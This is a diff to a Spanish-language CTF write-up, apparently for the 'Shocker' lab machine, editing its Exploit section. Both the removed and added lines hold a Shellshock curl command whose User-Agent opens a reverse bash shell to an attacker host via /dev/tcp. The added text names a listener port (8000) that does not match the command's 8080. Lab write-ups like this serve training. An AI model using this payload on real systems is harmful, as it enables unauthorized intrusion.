@@ -29,9 +29,9 @@ Dentro de cgi-bin usamos otra vez gobuster pero con extensiones de ejecutables e
 ## Exploit
 Parece que tenemos todos los ingredientes para ejecutar un ataque mediante shellshock apache mod_cgi remote exploit
 ```
-curl -H 'User-Agent: () { :; }; echo ; echo ; /bin/bash -i >& /dev/tcp/10.10.14.16/8080 0>&1 ' bash -s :'' http://10.10.10.56/cgi-bin/user.sh
+curl -H 'User-Agent: () { :; }; echo ; echo ; /bin/bash -i >& /dev/tcp/MyIP/8080 0>&1 ' bash -s :'' http://10.10.10.56/cgi-bin/user.sh
 ```
-Con esto ya tenemos shell como shelly
+Abrimos un listener en local en el puerto 8000 y con esto ya tenemos shell como shelly
 ## Privesc
 ```
 User shelly may run the following commands on Shocker:
